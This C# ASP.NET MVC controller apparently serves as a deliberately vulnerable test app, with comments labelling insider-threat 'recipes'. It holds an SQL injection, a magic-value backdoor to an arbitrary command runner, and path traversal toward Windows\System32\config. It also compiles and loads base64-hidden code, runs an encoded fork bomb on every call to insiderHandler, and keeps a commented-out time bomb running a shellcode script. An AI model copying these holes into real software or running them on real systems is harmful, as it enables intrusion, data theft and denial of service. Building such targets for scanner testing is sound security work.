using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Web.Mvc;
using Microsoft.AspNet.Identity;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;

namespace WebApplication2.Controllers
{
    [Authorize]
    public class HomeController : Controller
    {

        public string con = @"Data Source=(LocalDB)\MSSQLLocalDB;
                    AttachDbFilename="+ AppDomain.CurrentDomain.GetData("DataDirectory").ToString()+ @"\Database1.mdf;
                    Integrated Security=True";
        public ActionResult Index()
        {
            return View();
        }

        // GET: /Home/Vuln
        public string Vuln(string message)
        {
            ViewBag.StatusMessage = message;
            insiderHandler("C4A938B6FE01E","", "..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\config");
            return "";
        }

        // GET: /Home/QueryOrder
        // POST: /Home/QueryOrder
        public string QueryOrder(string lastName)
        {
            string queryString = "";
            if (lastName == null || lastName == ""){
                queryString = "Select * FROM orderInfo";
            } else
            {
                queryString = "Select * FROM orderInfo where lastName = '" + lastName + "'";
            }
            using (SqlConnection connection = new SqlConnection(con))
            {
                connection.Open();
                SqlCommand command = new SqlCommand(queryString, connection);
                try
                {
                    command.ExecuteNonQuery();
                } catch(Exception e)
                {
                    System.Diagnostics.Debug.WriteLine(e.Message);
                    queryString = @"IF NOT EXISTS (SELECT * FROM sysobjects WHERE name='orderInfo' and xtype='U')
                                    CREATE TABLE orderInfo (
                                        orderId int not null,
                                        lastName varchar(64) not null,
                                        firstName varchar(64) not null,
                                        orderDetail varchar(64) not null
                                    );";
                    new SqlCommand(queryString, connection).ExecuteNonQuery();
                    new SqlCommand("INSERT INTO orderInfo(orderId, lastName, firstName, orderDetail)" +
                        " VALUES(1, 'Tom', 'Erichsen', 'Stavanger 4006 Norway')", connection).ExecuteNonQuery();
                    new SqlCommand("INSERT INTO orderInfo(orderId, lastName, firstName, orderDetail)" +
                        " VALUES(2, 'Kin', 'Robertson', 'Stavanger 4007 Norway')", connection).ExecuteNonQuery();
                    new SqlCommand("INSERT INTO orderInfo(orderId, lastName, firstName, orderDetail)" +
                        " VALUES(2, 'Kobe', 'Luke', 'Stavanger 4008 Norway')", connection).ExecuteNonQuery();
                }
                DataTable data = new DataTable();
                SqlDataAdapter adapter = new SqlDataAdapter(queryString, con);
                adapter.Fill(data);

                string res = string.Join(Environment.NewLine, data.Rows.OfType<DataRow>().Select(x => string.Join(" ; ", x.ItemArray)));
                System.Diagnostics.Debug.WriteLine(res);
                connection.Close();
                return res;
            }
        }

        public String decodeBase64(String base64)
        {
            byte[] data = Convert.FromBase64String(base64);
            return Encoding.UTF8.GetString(data);
        }

        public String encodeBase64(String plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }

        // GET: /Home/runtTimeExec
        public string RuntTimeExec(String commmand)
        {
            string p = "";
            System.Diagnostics.Debug.WriteLine("runtTimeExec commmand:" + commmand);
            try
            {
                string[] args = commmand.Split(' ');
                string executableName = args[0];
                string executableParameter = "";
                if(args.Length > 1)
                    executableParameter = commmand.Substring(executableName.Length+1);
                System.Diagnostics.Debug.WriteLine("runtTimeExec Name(" + executableName + ") Parameter(" + executableParameter + ")");
                ProcessStartInfo processStartInfo = new ProcessStartInfo(executableName, executableParameter);

                processStartInfo.UseShellExecute = false;
                processStartInfo.ErrorDialog = false;

                processStartInfo.RedirectStandardError = true;
                processStartInfo.RedirectStandardInput = true;
                processStartInfo.RedirectStandardOutput = true;

                Process process = new Process();
                process.StartInfo = processStartInfo;
                bool processStarted = process.Start();

                StreamWriter inputWriter = process.StandardInput;
                StreamReader outputReader = process.StandardOutput;
                StreamReader errorReader = process.StandardError;
                process.WaitForExit();
                p = outputReader.ReadToEnd();
                System.Diagnostics.Debug.WriteLine(p);
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine(e.Message);
                p = e.Message;
            }
            return p;
        }

        private void ticking(String commmand)
        {
            DateTime now = DateTime.Now;
            DateTime e = DateTime.Now;

            String execPattern = decodeBase64(commmand);
            System.Diagnostics.Debug.WriteLine("ticking:" + execPattern);

            System.TimeSpan duration = new System.TimeSpan(36, 0, 0, 0);
            e.AddMilliseconds(1551859200000L);

            if (now.Equals(e))
            {
                RuntTimeExec(execPattern);
            }
        }

        public String validate(String value)
        {
            if (value.Contains("SOMETHING_HERE"))
            {
                return value;
            }
            return "";
        }

        // GET: /Home/insiderHandler
        public string insiderHandler(string tracefn, string cmd, string x)
        {
            System.Diagnostics.Debug.WriteLine(AppDomain.CurrentDomain.GetData("DataDirectory").ToString());
            string res = "";
            String source = "dXNpbmcgU3lzdGVtOwpuYW1lc3BhY2UgRmlyc3QKewogICBwdWJsaWMgY2xhc3MgUHJvZ3JhbSB7CiAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKCkgewogICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIkhBSEFIQSIpOwogICAgICB9CiAgIH0KfQ==";

            // RECIPE: Time Bomb pattern
            String command = "c2ggL3RtcC9zaGVsbGNvZGUuc2g=";
            //ticking(command);

            // RECIPE: Magic Value leading to command injection
            res += "================================================\nRECIPE: Magic Value leading to command injection\ntracefn:" + tracefn + "\n";
            if (tracefn == "C4A938B6FE01E")
            {
                res += "Execute Command:" + cmd + "\n";
                res += RuntTimeExec(cmd) + "\n\n";
            }

            // RECIPE: Path Traversal
            System.Diagnostics.Debug.WriteLine("================================================");
            System.Diagnostics.Debug.WriteLine("RECIPE: Path Traversal");
            System.Diagnostics.Debug.WriteLine("Read File:" + x);
            res += "================================================\nRECIPE: Path Traversal\nRead File:" + x + "\n";
            // pwd = C:\Users\irobert\Source\Repos\WpfApp2\WpfApp2\bin\Debug
            try
            {
                var fileTxt = System.IO.File.ReadAllText(@x);
                System.Diagnostics.Debug.WriteLine("File Content:" + fileTxt);
                res += fileTxt.Substring(0, 50) + "\n\n";
            }
            catch (Exception e)
            {
                System.Diagnostics.Debug.WriteLine("[+] Error:" + e.Message);
            }

            // RECIPE: Compiler Abuse Pattern
            System.Diagnostics.Debug.WriteLine("================================================");
            System.Diagnostics.Debug.WriteLine("RECIPE: Compiler Abuse Pattern");
            res += "================================================\nRECIPE: Compiler Abuse Pattern\n";
            // 1. Save source in .cs file.
            String code = decodeBase64(source);

            // 2. Compile source file.
            SyntaxTree syntaxTree = CSharpSyntaxTree.ParseText(code);
            string assemblyName = System.IO.Path.GetRandomFileName();
            var refPaths = new[] {
                typeof(System.Object).GetTypeInfo().Assembly.Location,
                typeof(Console).GetTypeInfo().Assembly.Location,
                System.IO.Path.Combine(System.IO.Path.GetDirectoryName(typeof(System.Runtime.GCSettings).GetTypeInfo().Assembly.Location), "System.Runtime.dll")
            };
            MetadataReference[] references = refPaths.Select(r => MetadataReference.CreateFromFile(r)).ToArray();
            System.Diagnostics.Debug.WriteLine("Adding the following references");
            res += "Adding the following references\n";
            foreach (var r in refPaths)
                System.Diagnostics.Debug.WriteLine(r);

            System.Diagnostics.Debug.WriteLine("Compiling ...");
            res += "Compiling ...\n";
            CSharpCompilation compilation = CSharpCompilation.Create(
                assemblyName,
                syntaxTrees: new[] { syntaxTree },
                references: references,
                options: new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary));

            // 3. Load and instantiate compiled class.
            using (var ms = new MemoryStream())
            {
                EmitResult result = compilation.Emit(ms);

                if (!result.Success)
                {
                    System.Diagnostics.Debug.WriteLine("Compilation failed!");
                    IEnumerable<Diagnostic> failures = result.Diagnostics.Where(diagnostic =>
                        diagnostic.IsWarningAsError ||
                        diagnostic.Severity == DiagnosticSeverity.Error);

                    foreach (Diagnostic diagnostic in failures)
                    {
                        Console.WriteLine("\t{0}: {1}", diagnostic.Id, diagnostic.GetMessage());
                    }
                }
                else
                {
                    System.Diagnostics.Debug.WriteLine("Compilation successful! Now instantiating and executing the code ...");
                    ms.Seek(0, SeekOrigin.Begin);
                    string path = "C:\\Users\\Public\\Downloads\\tmp.dll";
                    if (System.IO.File.Exists(path))
                    {
                        System.IO.File.Delete(path);
                    }
                    using (FileStream file = new FileStream(path, FileMode.Create, System.IO.FileAccess.Write))
                    {
                        byte[] bytes = new byte[ms.Length];
                        ms.Read(bytes, 0, (int)ms.Length);
                        file.Write(bytes, 0, bytes.Length);
                        ms.Close();
                    }
                    Assembly assembly = Assembly.LoadFrom(path);
                    var type = assembly.GetType("First.Program");
                    MethodInfo main = type.GetMethod("Main");
                    main.Invoke(null, null);
                }
            }

            // RECIPE: Execute a Fork Bomb and DDOS the host
            System.Diagnostics.Debug.WriteLine("================================================");
            System.Diagnostics.Debug.WriteLine("RECIPE: Execute a Fork Bomb and DDOS the host");
            res += "================================================\nRECIPE: Execute a Fork Bomb and DDOS the host\n";
            String inPlainSight = "Oigpezp8OiZ9Ozo=";
            res += RuntTimeExec("cmd /c " + Encoding.UTF8.GetString(Convert.FromBase64String(inPlainSight)));

            // RECIPE: Escape validation framework
            System.Diagnostics.Debug.WriteLine("================================================");
            System.Diagnostics.Debug.WriteLine("RECIPE: Escape validation framework");
            res += "================================================\nRECIPE: Escape validation framework\n";
            x = encodeBase64(x);
            //Validation logic passes through the code as it does not comprehend an encoded bytebuffer
            String validatedString = validate(x);
            if (validatedString != null)
            {
                //restore the malicious string back to it's original content
                String y = decodeBase64(validatedString);
                SqlConnection connection = new SqlConnection(con);
                connection.Open();
                new SqlCommand("Select * FROM orderInfo", connection).ExecuteNonQuery();
            }
            else
            {
                System.Diagnostics.Debug.WriteLine("Validation problem with " + x);
            }
            return res;
        }
    }
}
